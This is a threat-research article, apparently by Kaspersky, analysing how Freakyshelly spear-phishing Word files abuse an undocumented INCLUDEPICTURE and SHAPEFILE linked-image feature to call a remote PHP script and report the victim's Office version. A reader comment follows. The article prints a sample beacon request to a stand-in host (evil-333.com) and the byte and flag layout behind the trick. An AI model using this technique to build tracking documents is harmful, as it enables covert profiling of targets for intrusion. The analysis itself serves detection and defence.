														<h1 class="c-article__title">An (un)documented Word feature abused by attackers</h1>							<div class="c-article__info">
																<p class="c-article__headline u-hidden u-block@md">
									<a href="https://securelist.com/category/research/" class="c-tag c-tag--primary">Research</a>

									<svg class="o-icon o-svg-icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-hourglass"></use></svg> <span class="js-reading-time"></span> minute read								</p>

											<div class="js-reading-content">
												<div class="c-wysiwyg">
													<p>A little while back we were investigating the malicious activities of the Freakyshelly targeted attack and came across spear phishing emails that had some interesting documents attached to them. They were in OLE2 format and contained no macros, exploits or any other active content. However, a close inspection revealed that they contained several links to PHP scripts located on third-party web resources. When we attempted to open these files in Microsoft Word, we found that the application addressed one of the links. As a result, the attackers received information about the software installed on the computer.</p>
<p>What did the bad guys want with that information? Well, to ensure a targeted attack is successful, intelligence first needs to be gathered, i.e. the bad guys need to find ways to reach prospective victims and collect information about them. In particular, they need to know the operating system version and the version of some applications on the victim computer, so they can send it the appropriate exploit.</p>
<p>In this specific case, the document looked like this:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170846/170911-undocumented-word-1.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170846/170911-undocumented-word-1.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>There&#8217;s nothing suspicious about it at first glance – just a few tips about how to use Google search more effectively. The document contains no active content, no VBA macros, embedded Flash objects or PE files. However, when the user opens the document, Word sends the following GET request to one of the internal links. So we opened the original document used in the attack, replaced the suspicious links with http://evil-*, and obtained the following:</p>
<div style="margin:0 0 30px 40px;padding:30px 30px 0 30px;background-color:#eee">
<p><em>GET http://evil-333.com/cccccccccccc/ccccccccc/ccccccccc.php?cccccccccc HTTP/1.1</em><br />
<em>Accept: */*</em><br />
<em>User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.2; <strong>MSOffice 12</strong>)</em><br />
<em>Accept-Encoding: gzip, deflate</em><br />
Host: evil-333.com<br />
Proxy-Connection: Keep-Alive</p>
</div>
<p>This code effectively sent information about the software installed on the victim machine to the attackers, including info about which version of Microsoft Office was installed. We decided to examine why Office followed that link, and how these links can be identified in documents.</p>
<h2 id="inside-a-word-document">Inside a Word document</h2>
<p>The first thing about the document that caught our eye was the INCLUDEPICTURE field containing one of the suspicious links. However, as can be seen, that is not the link that Word addresses.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170850/170911-undocumented-word-2.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170850/170911-undocumented-word-2.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>As a matter of fact, the data chunk seen in the fragment above contains the first and only piece of text in this document. The text in Word documents resides in the WordDocument stream in a &#8216;raw state&#8217;, i.e. it contains no formatting except so-called fields. The fields tell Word that a certain segment of the text must be presented in a specific way; for example, it is thanks to these fields that we can see active links to other pages of the document, URL links, etc. The field INCLUDEPICTURE indicates that an image is attached to certain characters in the text. The 0x13 byte (marked in red) in front of this field indicates that the &#8216;raw&#8217; text ends there and a field description begins. The description format is roughly as follows (according to <a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-doc/ccd7b486-7881-484c-a137-51170af7cc22">[MS-DOC]: Word (.doc) Binary File Format</a>):</p>
<div style="margin:0 0 30px 40px;padding:30px 30px 0 30px;background-color:#eee">
<p style="text-align:center"><em>Begin = 0x13</em><br />
<em>Sep = 0x14</em><br />
<em>End = 0x15</em><br />
<em>Field = &lt;Begin&gt; *&lt;Field&gt; [Sep] *&lt;Field&gt; &lt;End&gt;</em></p>
</div>
<p>The separator byte 0x14 is marked in yellow, and the field end byte 0x15 is shown inside the pink box.</p>
<p>The link to the image in the INCLUDEPICTURE field should be in ASCII format, but in this case it is in Unicode, so Word ignores the link. However, the separator byte 0x14 is followed by the byte 0x01 (shown in the green box) which indicates to the word processor that an image should be inserted at this point. The question is: how do we find this image?</p>
<p>The characters and groups of characters within the text also possess properties; just like fields, these properties are responsible for formatting (for example, they specify that a certain piece of text must be rendered in italics). The properties of characters are stored in a two-level table within document streams under the names &#8216;xTable&#8217; and &#8216;Data&#8217;. We will not go into the complex details of how to analyze character properties, but as a result of this analysis we can find the character properties from the offset 0x929 to 0x92C in the WordDocument stream:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170855/170911-undocumented-word-3.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170855/170911-undocumented-word-3.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>This is the byte sequence with the picture placeholder 0x14 0x01 0x15. In the actual document, these bytes are located at offsets 0xB29 – 0xB2C, but the WordDocument stream begins with offset 0x200, and the character offsets are specified relative to its beginning.</p>
<p>The properties of the group of characters CP[2] indicate that an image is attached to them that is located in the Data stream at offset 0:</p>
<div style="margin:0 0 30px 40px;padding:30px 30px 0 30px;background-color:#eee">
<p style="text-align:center"><em>1FEF: prop[0]: 6A03 CPicLocation<br />
1FF1: value[0]: 00000000 ; character = 14</em></p>
</div>
<p>We arrive at this conclusion based on the fact that byte 0x01 is indicated in the INCLUDEPICTURE field&#8217;s value – this means the image should be located in the Data stream at the appropriate offset. If this value were different, then it would have been necessary to look for the image in a different place or ignore this property.</p>
<p>This is where we stumbled on an undocumented feature. Microsoft Office documentation provides basically no description of the INCLUDEPICTURE field. This is all there is:</p>
<div style="margin:0 0 30px 40px;padding:30px 30px 0 30px;background-color:#eee">
<p style="text-align:center"><em>0x43 INCLUDEPICTURE Specified in [ECMA-376] part 4, section 2.16.5.33.</em></p>
</div>
<p>Standard ECMA-376 describes only that part of INCLUDEPICTURE that precedes the separator byte. It has no description of what the data that follows it may mean, and how it should be interpreted. This was the main problem in understanding what was actually happening.</p>
<p>So, we go to offset 0 in the Data stream and see that the so-called SHAPEFILE form is located there:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170858/170911-undocumented-word-4.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170858/170911-undocumented-word-4.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>Forms are described in a different Microsoft document: <a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-odraw/8560795e-7759-4745-838f-f7f2ef2f1872">[MS-ODRAW]: Office Drawing Binary File Format</a>. This form has a name and, in this case, it is another suspicious link:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170904/170911-undocumented-word-5.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170904/170911-undocumented-word-5.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>However, this is just an object name, so this link is not used in any way. While investigating this form further, let&#8217;s look at the flags field (in the red box):</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170900/170911-undocumented-word-6.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170900/170911-undocumented-word-6.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>The value 0x0000000E resolves into a combination of three flags:</p>
<ul>
<li>msoblipflagURL 0x00000002</li>
<li>msoblipflagDoNotSave 0x00000004</li>
<li>msoblipflagLinkToFile 0x00000008</li>
</ul>
<p>This indicates that additional data should be attached to the form (it is highlighted in yellow in the screenshot), and that this data constitutes a URL that leads to the actual content of the form. Also, there is a &#8216;do not save&#8217; flag, which prevents this content from being saved to the actual document when it is opened.</p>
<p>If we look at what this URL is, we see that it&#8217;s the actual link that Word follows when the document is opened:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170906/170911-undocumented-word-7.png" class="magnificImage"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/09/07170906/170911-undocumented-word-7.png" alt="" class="aligncenter size-full wp-image-81520" /></a></p>
<p>We should note that besides Word for Windows, this &#8216;feature&#8217; is also present in Microsoft Office for iOS and in Microsoft Office for Android; LibreOffice and OpenOffice do not have it. If this document is opened in LibreOffice or OpenOffice, the malicious link is not called.</p>
<p>This is a complex mechanism that the bad guys have created to carry out profiling of potential victims for targeted attacks. In other words, they perform serious in-depth investigations in order to stay undetected while they carry out targeted attacks.</p>
<p>Kaspersky Lab&#8217;s security products are able to detect when the technique described in this article is used in Microsoft Word documents, and to find links embedded in a document using the same technique.</p>

										<p>The assertion that &#8220;should be in ASCII format, but in this case it is in Unicode, so Word ignores the link&#8221; is incorrect. Just make yourself a trivial .doc with an IncludePicture containing Unicodes in the path and you&#8217;ll see it&#8217;s in Unicode. (I&#8217;d attach a screen grab if I could.) Indeed, the MS-DOC &amp; ECMA specs allow both DOS format and IRI strings in an IncludePicture. IRI specifies UCS (Unicode) characters. Matter of fact, even the field name INCLUDEPICTURE may be in UCS as Word was a very enthusiastic early adopter of UCS everywhere.</p>
<p>However, the 0x14 0x01 at the end of the INCLUDEPICTURE has no business being there. The 0x14 is a separator (e.g. used between the 2 cases in an IF field), but INCLUDEPICTURE doesn&#8217;t have a 2nd subfield. No separator needed. I haven&#8217;t tried to create such a doc, but I suspect the 0x14 and following 0x01 0x15 confuse Word enough that it ignores the field and falls back on the other path it has cached in the doc.</p>
